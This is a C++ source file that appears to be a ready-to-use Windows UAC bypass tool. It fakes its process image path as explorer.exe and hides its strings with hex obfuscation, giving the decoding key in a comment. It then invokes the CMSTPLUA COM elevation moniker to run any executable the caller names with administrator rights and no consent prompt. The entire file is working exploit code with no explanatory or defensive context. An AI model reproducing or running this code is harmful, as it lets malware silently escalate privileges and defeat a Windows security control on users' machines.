#define WIN32_LEAN_AND_MEAN
#define VC_EXTRALEAN
#define NOMINMAX
#define NOGDI
#define NOSERVICE
#define NOSOUND
#define NOMCX
#define NOCOMM
#define NOKERNEL
#define NOGDICAPMASKS

#include <windows.h>
#include <winternl.h>
#include <objbase.h>
#include <string>

#pragma comment(linker, "/ALIGN:512")

static PPEB Peb = (PPEB)(*(uintptr_t*)((BYTE*)__readgsqword(0x30) + 0x60));

static std::wstring reveal(const std::string& hexString, const wchar_t* key)
{
    auto nibble = [](char c) -> int
    {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return 0;
    };

    size_t keyLen = wcslen(key);
    size_t n = hexString.size() / 2;

    std::wstring originalText;
    originalText.reserve(n);

    for (size_t i = 0; i < n; ++i) {
        int byteValue = (nibble(hexString[2 * i]) << 4) | nibble(hexString[2 * i + 1]);
        int keyValue = static_cast<unsigned char>(key[i % keyLen]);
        int originalValue = ((byteValue - keyValue - static_cast<int>(i)) % 256 + 256) % 256;
        originalText.push_back(static_cast<wchar_t>(originalValue));
    }

    return originalText;
}

static void MyWcsCpy(wchar_t* dest, size_t destSize, const wchar_t* src) {
    size_t i = 0;
    while (i < destSize - 1 && src[i] != L'\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = L'\0';
}

//key: m4a1_dev4
//usage: m4a1_dev4 executable_path
int wmain(int argc, wchar_t* argv[]) 
{
    if (argc < 3) return 1;
    MyWcsCpy(Peb->ProcessParameters->ImagePathName.Buffer, Peb->ProcessParameters->ImagePathName.MaximumLength / sizeof(WCHAR), reveal("b06fbf8bccd7cfecb3e99ad1b5dcdee3f8aaf175dabeda", argv[1]).c_str()); //C:\\Windows\\explorer.exe

    HRESULT hr = CoInitialize(0);
    IUnknown* p = 0;
    BIND_OPTS3 b = { sizeof(b) };
    b.dwClassContext = CLSCTX_LOCAL_SERVER;

    IID iid;
    HRESULT hr2 = IIDFromString(reveal("e86ba878a79fafb470a3819c6da39fa8cb7cb474b77dabbcaad483bf84ae88b7b9cbca8bd4d6", argv[1]).c_str(), &iid); //{6EDD6D74-C007-4E75-B76A-E5740995E24C}
    if (SUCCEEDED(hr2) && SUCCEEDED(CoGetObject(reveal("b2a1c8aac4ddd4ecaab07fd0aad5e0ddf9b9f1a8e9b5e79cebf4c5c2cbb194b3cac9cf9dca86c099bcbebcd593d099bd9ac0cccbd7aad49dc99ccdd3e7f5b7efab1f", argv[1]).c_str(), (BIND_OPTS*)&b, iid, (void**)&p)) && p) { //Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
        typedef HRESULT(__stdcall* F)(IUnknown*, LPCWSTR, LPCWSTR, LPCWSTR, ULONG, ULONG);
        F f = (F)(*(void***)p)[9];
        if (SUCCEEDED(f(p, argv[2], 0, 0, 0, 5))) hr = S_OK;
        p->Release();
    }   
    if (hr == S_OK) CoUninitialize();
    return 0;
}